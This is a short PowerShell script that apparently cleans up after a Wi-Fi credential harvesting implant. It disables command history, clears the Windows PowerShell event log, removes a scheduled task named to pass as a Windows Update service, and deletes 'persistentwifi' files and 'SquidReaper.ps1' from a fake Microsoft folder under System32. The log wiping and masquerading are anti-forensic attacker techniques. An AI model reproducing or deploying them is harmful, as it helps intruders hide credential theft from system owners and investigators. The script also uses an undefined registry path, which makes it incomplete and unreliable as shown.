<# Script to delete wifiper... task. #>
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\"
$code = (Get-ItemProperty -Path $regPath).Code
$oldFilePath = Join-Path -Path $basepath -ChildPath "persistentwifi-$code.txt"
$newFilePath = Join-Path -Path $basepath -ChildPath "persistentwifi-$code-raw.txt"
$squidpath = Join-Path -Path $basepath -ChildPath "SquidReaper.ps1"
$taskname = "Windows Update Service For Wlan Drivers"

#Task deletion.
if (Get-ScheduledTask -TaskName $taskname -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskname -Confirm:$false -ErrorAction SilentlyContinue
} else {}

#File deletion.
Remove-Item -Path $oldFilePath -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $newFilePath -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path $squidpath -Confirm:$false -ErrorAction SilentlyContinue